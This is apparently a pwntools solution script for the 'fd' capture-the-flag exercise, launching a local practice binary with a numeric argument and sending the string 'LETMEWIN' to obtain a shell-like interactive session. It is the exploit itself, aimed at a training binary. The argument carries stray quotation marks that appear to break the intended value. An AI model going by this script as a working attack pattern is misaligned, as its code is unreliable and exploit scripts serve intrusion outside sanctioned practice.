#!/usr/bin/env python3
from pwn import *


io = process(['./fd', '"4660"'])
io.sendline(b'LETMEWIN\n')
io.interactive()